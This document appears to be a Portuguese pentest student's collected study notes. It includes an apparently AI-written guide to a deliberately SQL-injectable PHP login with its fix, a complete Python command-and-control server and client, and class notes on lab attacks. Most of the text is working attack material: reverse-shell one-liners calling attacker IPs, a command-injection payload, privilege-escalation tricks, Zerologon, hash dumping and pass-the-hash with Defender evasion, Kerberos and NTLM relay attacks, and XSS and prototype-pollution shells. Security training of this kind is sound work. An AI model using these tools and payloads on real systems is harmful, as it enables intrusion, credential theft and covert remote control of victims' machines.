X_train, X_test, y_train, y_test = train_test_split(iris.data, iris.target, test_size=0.3, random_state=42)

# Treinar o modelo de Árvore de Decisão
clf = DecisionTreeClassifier(random_state=42)
clf.fit(X_train, y_train)

# Fazer previsões no conjunto de teste
y_pred = clf.predict(X_test)

# Avaliar a precisão do modelo
accuracy = accuracy_score(y_test, y_pred)
report = classification_report(y_test, y_pred, target_names=iris.target_names)

print(f'Accuracy: {accuracy}')
print('Classification Report:')
print(report)
```

### Explicação para os Alunos
- O conjunto de dados Iris é um clássico conjunto de dados utilizado para tarefas de classificação.
- O objetivo é prever a espécie de uma flor com base em suas medidas (comprimento e largura das sépalas e pétalas).
- A atividade envolve dividir os dados em conjuntos de treino e teste, treinar um modelo de classificação e avaliar sua precisão.
- Eles podem experimentar diferentes algoritmos para comparar os resultados e entender os pontos fortes e fracos de cada um.

Recebi a parte 2. Vamos adaptar esse passo a passo para usar o `docker build` em vez do `docker-compose`. Aqui está a versão adaptada:

### Passo a Passo para Criar um Site com Área Logada Vulnerável a SQL Injection usando Docker

## Passo 1: Logar no Servidor via SSH

Primeiro, faça login no servidor via SSH utilizando as credenciais fornecidas:

```Sh
ssh debian@192.168.161.40
```

Usuário: `debian`  
Senha: `PAssW0rd`

Após logar no servidor, eleve os privilégios para root:

```Sh
sudo su
```

## Passo 2: Criar a Pasta do Projeto

No terminal, crie uma pasta chamada `portal-vuln` dentro do diretório `/home/debian` para armazenar os arquivos do projeto:

```Sh
mkdir -p /home/debian/portal-vuln
cd /home/debian/portal-vuln
```

## Passo 3: Configuração do Docker

Criar os diretórios e arquivos necessários:

```Sh
mkdir -p web/html web/nginx/conf.d
touch Dockerfile web/Dockerfile web/nginx/conf.d/default.conf web/html/login.php web/html/dashboard.php web/html/styles.css web/init.sql
```

## Passo 4: Criação do Dockerfile para o Serviço Web

Edite o arquivo `web/Dockerfile` com o seguinte conteúdo:

```Dockerfile
FROM php:7.4-fpm

# Instalar extensões PHP
RUN docker-php-ext-install mysqli

# Copiar arquivos HTML
COPY html /var/www/html

CMD ["php-fpm"]
```

## Passo 5: Criação do Banco de Dados

Edite o arquivo `web/init.sql` com o seguinte conteúdo:

```sql
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(50) NOT NULL
);

INSERT INTO users (username, password) VALUES ('admin', 'adminpass');
```

## Passo 6: Criação do Código PHP

Edite o arquivo `web/html/login.php` com o seguinte conteúdo:

```php
<?php
$servername = "db";
$username = "user";
$password = "password";
$dbname = "mydatabase";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

$error_message = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $username = $_POST["username"];
  $password = $_POST["password"];

  $sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
  $result = $conn->query($sql);

  if ($result->num_rows > 0) {
    header("Location: dashboard.php");
    exit();
  } else {
    $error_message = "Invalid credentials.";
  }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <h1>Login</h1>
    <?php if (!empty($error_message)): ?>
      <div class="error-message"><?php echo $error_message; ?></div>
    <?php endif; ?>
    <form method="post" action="">
      Username: <input type="text" name="username"><br>
      Password: <input type="password" name="password"><br>
      <input type="submit" value="Login">
    </form>
  </div>
</body>
</html>
```

Edite o arquivo `web/html/dashboard.php` com o seguinte conteúdo:

```php
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Dashboard</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <h1>Welcome to the dashboard!</h1>
    <p>This is a protected area.</p>
  </div>
</body>
</html>
```

Edite o arquivo `web/html/styles.css` com o seguinte conteúdo:

```css
body {
  font-family: Arial, sans-serif;
  background-color: #f4f4f4;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  margin: 0;
}

.container {
  background-color: #fff;
  padding: 20px;
  border-radius: 8px;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
}

h1 {
  text-align: center;
  color: #333;
}

form {
  display: flex;
  flex-direction: column;
}

input[type="text"], input[type="password"] {
  padding: 10px;
  margin: 10px 0;
  border: 1px solid #ccc;
  border-radius: 4px;
}

input[type="submit"] {
  padding: 10px;
  background-color: #007bff;
  color: #fff;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

input[type="submit"]:hover {
  background-color: #0056b3;
}

.error-message {
  background-color: #ff4d4d;
  color: white;
  padding: 10px;
  border-radius: 4px;
  margin-bottom: 15px;
  text-align: center;
}
```

## Passo 7: Configuração do Nginx

Edite o arquivo `web/nginx/conf.d/default.conf` com o seguinte conteúdo:

```nginx
server {
    listen 80;

    server_name localhost;

    root /var/www/html;
    index login.php index.html;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        include fastcgi_params;
        fastcgi_pass web:9000;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }

    error_log /var/log/nginx/error.log;
    access_log /var/log/nginx/access.log;
}
```

## Passo 8: Dockerfile para o Ambiente

Edite o arquivo `Dockerfile` no diretório raiz com o seguinte conteúdo:

```Dockerfile
# Etapa 1: Construir a imagem do PHP
FROM php:7.4-fpm AS php-build

# Instalar extensões PHP
RUN docker-php-ext-install mysqli

# Copiar arquivos HTML
COPY web/html /var/www/html

# Etapa 2: Construir a imagem do Nginx
FROM nginx:latest AS nginx-build

COPY web/nginx/conf.d/default.conf /etc/nginx/conf.d/default.conf
COPY --from=php-build /var/www/html /var/www/html

# Expor a porta
EXPOSE 80

CMD ["nginx", "-g", "daemon off;"]
```

## Passo 9: Construir e Rodar as Imagens

No diretório raiz `/home/debian/portal-vuln/`, construa e rode as imagens:

```sh
docker build -t portal-vuln .
docker run -d -p 8084:80 --name portal-vuln-container portal-vuln
```

## Passo 10: Testando a Vulnerabilidade

Acesse o site no navegador em `http://localhost:8084` e faça login utilizando `admin` como usuário e `adminpass` como senha.

Para testar a vulnerabilidade de SQL Injection, tente injetar `admin' OR '1'='1` no campo de nome de usuário e qualquer coisa no campo de senha.

Você está certo, parece que parte do conteúdo foi cortado. Aqui está o passo a passo completo para corrigir a vulnerabilidade de SQL Injection usando prepared statements:

Entendi, vamos adaptar para não usar `docker-compose`. Aqui está o passo a passo corrigido:

### Passo a Passo para Corrigir a Vulnerabilidade de SQL Injection

#### Passo 1: Usando Prepared Statements

Edite o arquivo `web/html/login.php` para usar prepared statements:

```php
<?php
$servername = "db";
$username = "user";
$password = "password";
$dbname = "mydatabase";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

$error_message = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $username = $_POST["username"];
  $password = $_POST["password"];

  $stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
  $stmt->bind_param("ss", $username, $password);
  $stmt->execute();
  $result = $stmt->get_result();

  if ($result->num_rows > 0) {
    header("Location: dashboard.php");
    exit();
  } else {
    $error_message = "Invalid credentials.";
  }

  $stmt->close();
}

$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <h1>Login</h1>
    <?php if (!empty($error_message)): ?>
      <div class="error-message"><?php echo $error_message; ?></div>
    <?php endif; ?>
    <form method="post" action="">
      Username: <input type="text" name="username"><br>
      Password: <input type="password" name="password"><br>
      <input type="submit" value="Login">
    </form>
  </div>
</body>
</html>
```

#### Passo 2: Reiniciar o Ambiente Docker

Pare e remova o container existente:

```sh
docker stop portal-vuln-container
docker rm portal-vuln-container
```

Construa a imagem novamente:

```sh
docker build -t portal-vuln .
```

Rode o container:

```sh
docker run -d -p 8084:80 --name portal-vuln-container portal-vuln
```

#### Passo 3: Testando a Correção da Vulnerabilidade

Acesse o site no navegador em `http://localhost:8084` e tente injetar novamente `admin' OR '1'='1` no campo de nome de usuário e qualquer coisa no campo de senha.
Você perceberá que a mensagem **"Invalid Credentials"** será apresentada novamente.
Para validar que a funcionalidade de login esteja funcionando corretamente após os ajustes, faça login utilizando `admin` como usuário e `adminpass` como senha.
Você deverá visualizar o portal da área logada `dashboard.php`, garantindo que a correção não afetou a funcionalidade de login do portal.
Se precisar de mais alguma coisa, estou aqui para ajudar! 🎉

## ASIP

Codigos em python para criar um C2 (Command & Control)

Codigo servidor.py abaixo

	import argparse
	import socket
	import threading
	
	import colorama
	from console import Console
	from sessao import Sessao
	
	colorama.init(autoreset=True)
	
	class Servidor(Console):
	    prompt = f"{colorama.Fore.RED}C2 > {colorama.Fore.RESET}"
	    
	    def __init__(self):
	        super().__init__()
	        self.sessoes = []
	        self.sockets = []
	        self.contador_sessao = 1
	
	    def criar_listener(self, porta):
	        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	        sock.bind(("0.0.0.0", porta))
	        sock.listen(5)
	        
	        self.sockets.append(sock)
	        print(f"Escutando na porta {porta}...")
	
	        while True:
	            try:
	                sock.settimeout(5)
	                conexao, endereco = sock.accept()
	                sock.settimeout(None)
	                print(f"{colorama.Fore.GREEN}[+] Sessão #{self.contador_sessao} estabelecida - {endereco}")
	                sessao = Sessao(conexao, self.sessoes, self.contador_sessao)
	                self.sessoes.append(sessao)
	                self.contador_sessao += 1
	            except socket.timeout:
	                continue
	            except OSError:
	                break
	    
	    def comando_servidor(self, args):
	        parser = argparse.ArgumentParser(prog='servidor', add_help=False)
	        parser.add_argument('-p', '--porta', type=int)
	        
	        try:
	            args = parser.parse_args(args.split())
	        except:
	            return
	        
	        if args.porta:
	            threading.Thread(target=self.criar_listener, args=(args.porta,), daemon=True).start()
	        else:
	            print("Comando do servidor inválido.")
	    
	    def comando_sessoes(self, args):
	        
	        parser = argparse.ArgumentParser(prog='sessoes', add_help=False)
	        parser.add_argument('-i', '--interagir', type=int)
	        
	        try:
	            args = parser.parse_args(args.split())
	        except:
	            return
	        
	        if args.interagir is not None:
	            sessao = self.encontrar_sessao(args.interagir)
	            if sessao:
	                sessao.interagir()
	            else:
	                print(f"{colorama.Fore.RED}[!] Seção {args.interagir} inválida !")
	        else:
	            print("Comando sessoes inválido.")
	    
	    def encontrar_sessao(self, id):
	        for sessao in self.sessoes:
	            if sessao.id == id:
	                return sessao
	
	if __name__ == "__main__":
	    servidor = Servidor()
	    servidor.prompt_loop()

Codigo client.py abaixo

	import socket
	import subprocess
	import time
	
	
	class C2Client:
	    def __init__(self, host, porta):
	        self.host = host
	        self.porta = porta
	        self.conexao = None
	
	    def conectar(self):
	        while True:
	            try:
	                self.conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	                self.conexao.connect((self.host, self.porta))
	                print(f"Conectado em {self.host}:{self.porta}")
	                self.escuta_por_comandos()
	            except (socket.error, ConnectionRefusedError) as e:
	                print(f"Falha na conexão: {e}. Tentando novamente em 5 segundos...")
	                time.sleep(5)
	
	    def executar_comando(self, comando):
	        funcao, _, argumentos = comando.partition(" ")
	        try:
	            funcao = getattr(self, f'comando_{funcao}')
	            if funcao and argumentos:
	                retorno = funcao(argumentos)
	            elif funcao and not argumentos:
	                retorno = funcao("")
	            if retorno:
	                return True
	        except AttributeError:
	            print(f"Nenhum comando chamado '{funcao}' foi encontrado.")
	        
	
	    def escuta_por_comandos(self):
	        while True:
	            try:
	                dados = self.receber_dados().decode()
	                self.executar_comando(dados)
	            except Exception as e:
	                print(f"Erro: {e}")
	                break
	
	    def comando_shell(self, comando):
	        try:
	            saida = subprocess.check_output(comando, shell=True, stderr=subprocess.PIPE, timeout=4)
	            print(saida)
	            if saida != b"":
	                self.enviar_dados(saida)
	            else:
	                self.enviar_dados("OK")
	        except Exception as e:
	            self.enviar_dados(f"Erro no shell: {e}")
	            print(f"Erro no shell: {e}")
	    
	    def enviar_dados(self, buffer):
	        if not isinstance(buffer, bytes):
	            buffer = buffer.encode()
	        try:
	            self.conexao.sendall(buffer)
	            return True
	        except:
	            return False
	            
	    def receber_dados(self):
	        dados = self.conexao.recv(1024)
	        if not dados:
	            raise ConnectionError("Conexão encerrada durante a recepção")
	        return dados
	    
	if __name__ == "__main__":
	    host = "127.0.0.1"
	    porta = 4445
	    client = C2Client(host, porta)
	    client.conectar()

Código console.py abaixo

	class Console:
	    prompt = 'Console > '
	    
	    def pegar_prompt(self):
	        return self.prompt
	                  
	    def prompt_loop(self):
	        while True:
	            try:
	                linha = input(self.pegar_prompt()).strip()
	                if self.executar_comando(linha) and linha.startswith("sair"):
	                    break
	            except KeyboardInterrupt:
	                print("[!] Detectado Ctrl+C. Digite 'sair' para encerrar ou continue usando o programa.")
	            except EOFError:
	                print("[!] Detectado Ctrl+D. Saindo...")
	                return True
	            except Exception as e:
	                print(f"[!] Erro inesperado: {e}")
	    
	    def executar_comando(self, comando):
	        # Separa a função dos argumentos
	        # Ex: "servidor -p 4445" -> "servidor", " ", "-p 4445"
	        funcao, _, argumentos = comando.partition(" ")
	        try:
	            # Procura pela função dentro da classe
	            funcao = getattr(self, f'comando_{funcao}')
	            # Verifica se tem algo escrito ou o input está em branco
	            if funcao and argumentos:
	                # Se achar executa a função com os argumentos
	                retorno = funcao(argumentos)
	            # Chama funções sem argumentos
	            elif funcao and not argumentos:
	                retorno = funcao("")
	                
	            if retorno:
	                return True
	        except AttributeError:
	            print(f"Nenhum comando chamado '{funcao}' foi encontrado.")

Código console.py abaixo

	import colorama
	from console import Console
	
	
	class Sessao(Console):
	    prompt = 'Sessão > '
	    
	    def __init__(self, conexao, sessoes, id):
	        super().__init__()
	        self.conexao = conexao
	        self.sessoes = sessoes
	        self.id = id
	        self.endereco = self.conexao.getpeername()
	    
	    def interagir(self):
	        """
	        Permite interação com a sessão (e.g., shell).
	        """
	        print(f"Interagindo com a sessão: {self.endereco}")
	        
	        self.prompt = f"{colorama.Fore.GREEN}Sessão #{self.id} {colorama.Fore.BLUE}➜ {colorama.Fore.CYAN}{self.endereco[0]}@{self.endereco[1]}{colorama.Fore.RESET}: "
	        
	        self.prompt_loop()
	    
	    def comando_shell(self, comando):
	        comando = comando.strip()
	        resposta = self.mandar_comando(comando)
	        print(resposta)
	    
	    def mandar_comando(self, comando):
	        self.enviar_dados(f"shell {comando}")
	        resposta = self.receber_dados().decode()
	        return resposta.strip()
	        
	    def enviar_dados(self, buffer):
	        if not isinstance(buffer, bytes):
	            buffer = buffer.encode()
	        try:
	            self.conexao.sendall(buffer)
	            return True
	        except TimeoutError:
	            self.printar(f"{colorama.Fore.RED}[!] Timeout durante o envio dos dados: {buffer}")
	        
	    def receber_dados(self):
	        dados = self.conexao.recv(1024)
	        if not dados:
	            raise ConnectionError("Conexão encerrada durante a recepção")
	        return dados


## EHTF Thiago Muniz

		AULA 02 EHTF
		
		Credenciais da máquina de escalação de privilégios
		debian:debian
		pedro:password
		joao:secret
		
		
		ALVO 1: 192.168.161.25
		
		
		VIMOS TAMBÉM EXPLORAÇÃO VIA FTP ANÔNIMO NA PORTA 8080 E RSYNC
		
		
		https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution
		
		REVSHELL PYTHON3
		
		python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.161.20",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
		
		
		PRIVESC

		hostname
		
		sudo -l
		
		hostnamectl
		
		lsb_release -a 
		
		sudo --version
		
		uname -a
		
		ps -U root -u root u # PROCESSOS RODANDO COMO ROOT
		
		cat /etc/hosts
		
		ip addr
		
		netstat -tulpn | grep LISTEN -- ALTERNATIVA ss -tulpn
		
		cat /etc/passwd
		ls /etc/passwd -l
		ls /etc/shadow -l
		
		env
		
		ARQUIVO PERMISSÃO DE ESCRITA
		find /etc -perm -2 -type f 2>/dev/null
		
		
		SUID
		find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
		find / -perm -u=s -type f 2>/dev/null
		find / -perm -u=s -type f 2>&-
		
		
		
		cat /etc/crontab
		
		
		
		- BIT SUID
		
		find / -perm -u=s -type f 2>&-
		
		/usr/bin/time /bin/sh -p
		
		bash -p
		
		find . -exec /bin/sh -p \; -quit
		
		bash -p
		
		cat /root/proof.txt
		
		
		- PASSWD
		openssl passwd thiago
		Criar entrada com outro nome, e muda o uid e sid
		thiagopriv:UCn9PWDseQCVI:0:0:,,,:/home/thiago:/bin/bash
		
		- SHADOW
		openssl passwd thiago
		root:!:19254:0:99999:7::: # ONDE TEM ! coloca a senha gerado
		root:UCn9PWDseQCVI:19254:0:99999:7:::
		su root
		
		
		
		
		- SUDO
		su Pedro
		
		sudo -l
		
		sudo man man
		!/bin/sh
		
		sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
		
		
		
		- CAPABILITIES
		getcap
		/usr/sbin/getcap -r /usr/
		python3.11 -c 'import os; os.setuid(0); os.system("/bin/sh")'
		
		
		
		- PATH
		magicbinary
		cd /tmp
		echo '/bin/bash -p' > /tmp/ls && chmod +x /tmp/ls
		export PATH=/tmp:$PATH
		echo $PATH
		
		- DOCKER
		docker run -it --rm -v /:/mnt bash
		cat /mnt/root/proof.txt
		
		
		- PRIVESC CRONTAB - precisa criar o arquivo /opt/security como root com permissão total
		
		cat /etc/crontab
		
		/opt/security.py
		
		ls -l /opt/security.py
		
		nano /opt/security.py # comenta o arquivo e adiciona o payload abaixo:
		
		import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.86",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
		
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
		
		
		MOSTRAR LINPEAS
		MOSTRAR LESS
		MOSTRAR LINENUM
		
		ssh -L 8080:172.16.1.16:80 thiagopriv@192.168.161 # A PORTA 80 DO IP 16 SERÁ ABERTA NO LOCALHOST:8080 PORTFORWARD via SSH PORT FORWARD TUNELAMENTO SSH REDIRECIONAMENTO DE PORTA
		ssh thiagopriv@192.168.161.25 -D 4321 -fN
		vim /etc/proxychains4.conf # NO FINAL ADD socks4 127.0.0.1  4321
		
		ALVO 2: 172.16.16.16
		proxychains -q nmap 172.16.16.16
		proxychains -q nmap -sT 172.16.16.16
		proxychains -q nmap -sT 172.16.16.16 -Pn
		
		proxychains netexec smb 172.16.16.16
		
		#Host 172.16.16.16 tem o LDAP rodando, sinal de que é um AD, mostra 
		
		ENUMERAÇÃO LDAP
		proxychains nmap -Pn -v -n -p 389 172.16.16.16 --script ldap-rootdse # obter informação sobre esquema do AD
		proxychains nmap -Pn -v -n -p 389 172.16.16.16 --script "ldap* and not brute"
		
		
		ENUMERAÇÃO DNS
		proxychains dig axfr xtr.local @172.16.16.16
		
		
		
		proxychains nmblookup -A 172.16.16.16
		proxychains  nbtscan 172.16.16.16
		proxychains  nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n 172.16.16.16
		
		
		netexec smb 172.16.16.16 --shares
		netexec smb 172.16.16.16 --users
		netexec smb 172.16.16.16 --pass-pol
		
		PROCURAR POR VULNERABILIDADES
		netexec smb 172.16.16.16 -L
		netexec smb 172.16.16.16 -M spooler
		netexec smb 172.16.16.16 -M ms17-010
		netexec smb 172.16.16.16 -M zerologon
		
		
		impacket-psexec # Faz upload de um binário no alvo e se o alvo estiver com proteção será alertado e bloqueado
		
		ZERO LOGON SCRIPTS (https://github.com/dirkjanm/CVE-2020-1472.git)
		git clone https://github.com/dirkjanm/CVE-2020-1472.git
		cd CVE-2020-1472
		proxychains -q python3 ex.py dc 172.16.16.16
		
		
		EXTRAIR HASHES
		proxychains impacket-secretsdump -just-dc xtr/dc\$@172.16.16.16 # $ pq é sem senha
		
		proxychains  netexec smb 172.16.16.16 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c' --shares
		proxychains netexec smb 172.16.16.16 -u administrator -H 'f07696198910eb5aff8e92517ae6c46c' --users
		proxychains netexec smb 172.16.16.16  -u administrator -H 'f07696198910eb5aff8e92517ae6c46c' --pass-pol
		
		proxychains netexec smb 172.16.16.16  -u administrator -H 'f07696198910eb5aff8e92517ae6c46c' -x whoami
		
		Pode fazer a pratica com psexec, mas nesse momento sem desabilitar a proteção vai ser detectado pelo defender
		proxychains impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16
		
		EXECUTAR COMANDOS NO SERVIDOR AD UTILIZANDO WMI PARA O WINDOWS DEFENDER NÃO PEGAR 
		proxychains impacket-wmiexec -hashes "hash_administrator" "dominio/usuario"@ip comando
		proxychains impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16 hostname
		proxychains impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16 "sc query WinDefend" # Identificar se o Defender está habilitado
		
		proxychains -q impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16 'where /r c: proof*'   
		
		proxychains -q impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16 'dir /s  proof*'   
		
		
		proxychains -q impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16 'type users\administrator\desktop\proof.txt.txt'


## COMMANDS

	curl -v -G 'http://192.168.161.254/command.php' --data-urlencode 'ip=127.0.0.1;export RHOST="192.168.161.20";export RPORT=1337;python3 -c '\''import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'\'''


## MTIA

- ACTIVE DIRECTORY ATTACK STEP BY STEP

Find users from Active Directory and save on a file
  
      net user /domain > ad_users_net.txt
      adfind.exe -f "objectcategory=computer" > ad_computers.txt
      net group "Domain Computers" /domain > ad_computers_net.txt
      adfind.exe -f "objectcategory=organizationalUnit" > ad_ous.txt
      net group /domain > ad_goup_net.txt

Gerar arquivo Criptografado com tipo de imagem para o pentest

	cryptsetup --verify-passphrase luksFormat File_Name.img
	sudo cryptsetup open  --type luks File_Name.img File_Name
	sudo mkfs.ext4 -L File_Name /dev/mapper/File_Name
	sudo mount /dev/mapper/File_Name ~/File_Name
	firefox -CreateProfile "prj_x" /File_Name/Firefox-Profile
	firefox -P prj_x

- Tipos de ataques ao KERBEROS

`AS-REP Roasting` PRECISA DA LISTA DE USUARIO - NAO ESTAR HABILITADO O PREAUTH - ACERTAR os HORARIOS - ADD HOSTNAME AO HOSTS 

    sudo nano /etc/hosts ADD IP-DC hostname.domain.local 
	sudo nano /etc/resolv.conf && echo "COLOCA O IP DO/S SERVIDOR/ES DNS"
    sudo net time set -S IP-DC
	kerbrute userenum -d floripa.local --dc 192.168.161.100 /usr/share/wordlists/users-pt-br.txt -o valid-users-dump
    impacket-GetNPUsers DOMAIN.LOCAL/ -no-pass -usersfile /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -format hashcat -outputfile output-reproast && echo "SALVA HASHES DO TIPO krbtg5 e -m 18200"

`Kerberoasting` PRECISA TER UMA CREDENCIAL VALIDA PARA FAZER ESSE TIPO DE ATAQUE

    impacket-GetNPUsers -request -dc-ip 192.168.2.37 brasil.floripa.local/maori:'PasW0rd432#_TheHardPassword:)' -outputfile file-HASHES-para-quebrar

`Pass the Key` e `Pass the Ticket` PRECISA TER A SECRET KEY DO USER ATRAVEZ DO MIMIKATZ ou DCSYNC, MAS É NECESSARIO PRIVILEGIOS & PRECISA TER ACESSO AO SERVIDOR QUE TENHA O TICKET VALIDO EM CACHE

    getTGT.py -aesKey 'kerberosKey' $domain/$user@target
    export KRB5CCNAME=/tmp/ticket.ccache
    impacket-psexec -k -no-pass -dc-ip DC-IP

`NTLM RELAY` FAZ UM MITM ENTRE O SERVIDOR E A PESSOA QUE TA TENTANDO AUTENTICAR. PRECISA DE PROTO COM SMB SIGNIN DESABILITADO, USUARIO PEDINDO AUTH E CRIAR A LISTA DE SERVER DE SMB

    sudo nano /etc/proxychains.conf ADICIONAR socks4 127.0.0.1 1080
    sudo nano /etc/responder/Responder.conf TROCAR SMB E HTTP para OFF
    crackmapexec smb 192.168.2.32/38 --gen-relay-list relay.txt AQUI NA LISTA CONTEM OS SERVERS COM SIGNIN FALSE
    TERMINAL 1 impacket-ntlmrelayx -tf relay.txt -smb2support -of netntlm -socks -ip IP-ATACANTE
    TERMINAL 2 sudo responder -I eth2
    TERMINAL 3 proxychains impacket-smbexec -no-pass 'PRAIAS'/'LENITA'@'192.168.2.37' PRAIAS LENITA E O IP SAO IMPUTS CAPITURADOS DO RESPONDER E NTLMRELAY
 
`Silver Ticket` PRECISA DO NT HASH do Serviço, DOMAIN SID, SPN

    ticketer.py -nthash HASE-NT-HERE -domain-sid SID-DOMAIN-HERE -domain floripa.local -spn SPN/HERE.floripa.local fake_user
    export KRB5CCNAME='/Path/fake_user.ccache'
    psexec.py -k HOST.floripa.local

`Golden Ticket` PRECISA DO NT HASH do KRBTGT (HASH MAIS IMPOSTANTE DO AD)

    ticketer.py -nthash HASE-NT-HERE -domain-sid SID-DOMAIN-HERE -domain floripa.local -spn SPN/HERE.floripa.local fake_user
    export KRB5CCNAME='/Path/fake_user.ccache'
    secretsdump.py -k dc01.floripa.local -just-dc-ntlm -just-dc-user krbtgt

ATAQUES GERAIS AO SMB

	for i in {100,110,120.220,230};do impacket-smbexec praias/sampaio:sexywolfy@192.168.161.$i ;done
	impacket-smbexec praias/sampaio:sexywolfy@192.168.161.110 ACESSA A SHELL DIRETO DO HOST CASO TENHA PERMISSAO
	nxc ALTERNATIVA AO crackmapexec

- Modulo XSS
payloads XSS

	src=1'onerror='alert(')'
	math=1';f(1)//

Prototype Pollution

	a = 1
	a.constructor.___proto___.bang=()=>[console.log("BOOM")]
	a.constructor.bang()
	github.com/BlackFan/client-side-prototype-pollution
	PAYLOAD REV SHELL PROTORYPE POLLUTION - USAR EM APLICACAO QUE TEM NODE JS
	var net = this.constructor.constructor('return
	this.process')().mainModule.require("net");var cp =
	this.constructor.constructor('return
	this.process')().mainModule.require("child process");sh
	= cp.spawn("/bin/bash",[]);var client = new
	net.Socket();client.connect(4444, "192.168.1.141",
	function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
	sh.stderr.pipe(client)；});

	<p v-show="_c.constructor'alert(1)'()"></p>
	<x v-on:click='_b.constructor'alert(1)'()'>click</x>
	<x is=script src=//14.Rs>


## PTA

Ao verificar que no NMAP uma porta (5000) estava rodando o serviço Docker Registry (API 2.0), foi forçado o caminho `_catalog`

	# Listar todos os repositórios
	curl -X GET http://<TARGET_IP>:5000/v2/_catalog
	# Exemplo de resposta: {"repositories":["app-web","app-database","internal-tool"]}
	
	# Listar todas as tags de um repositório específico
	curl -X GET http://<TARGET_IP>:5000/v2/app-web/tags/list
	# Exemplo de resposta: {"name":"app-web","tags":["latest","v1.0","debug"]}
	
	docker pull <TARGET_IP>:5000/app-web:latest

	curl -k -X GET "https://<TARGET_IP>:5000/v2/new-nginx/manifests/latest"
	# Captura mais informaçoes sobre a imgem Docker
	
  
TO BE CONTINUED
.
.
.
.
.
.
.
.
.
.
.
## PENTEST PLUS

`Hacker Ético` é o profissioal de cibersegurança que pode atuar desde u GRC, SOC, NOC, Atividade de RedTeam, criação de políticas, etc...
`Pentester` Atividade de Teste de prenetração com escopo, tempo, relatório.
`Red Team` Abrange mais atividades como Phishing, engenharia social.

RFP = Request for Proposal, o projeto em si, contrato, escopo, tempo, expectativa
ROE = Rule of Engagement, requisitos para uma determinada situação

Ordem de preços, para tipos de pentest: Gray, Black e Gray

`Payload` ação da exploração, fornecer um shellcode, criar um usuário...

`Exploit` é a exploração em si através de uma falha 

`Shellcode` um payload pode me trazer um shellcode

- Regulamentações
`HIPAA` - Regulamentação de Saúde bastante rigorosa
`PCIDSS` - Regulamentação de cartão de crédito. Precisa de um auditor para um nivel de transação acima de mill, com certificação QSA
`SHIELD` - Dados de cidadãos de New York
`CCPA` - Regulamenta o uso de dados de clientes

- Pentest Frameworks (estudar todos)

O OWASP Open Source com diversos projetos para aplicar nos testes, vão desde API até Kubernets etc - Projeto Open para WAF

Outros padrões e frameworks de PenTest `NIST OSSTMM ISSAF PTES MITRE`

`GanttProject` Open Source software para gerenciamento de timeline de projetos

`MSA` é o NDA comercial, que contempla prazos de pagamentos

`SOW` é o que define quem vai participar e em qual parte do projeto. ´Statement of Work` Lista de entregaveis, agendas, time. Seria o KickOff do pentest.

`Acordo do nivel de serviço` Mensuração do serviço definida e remediação ou penalidades devem ser acordadas. Service Level Agreement - SLA

Estágios de uma vulnerabilidade registrada: Discover -> Coordinate -> mitigate -> Manage -> Document

- Ferramentas e Softwares online


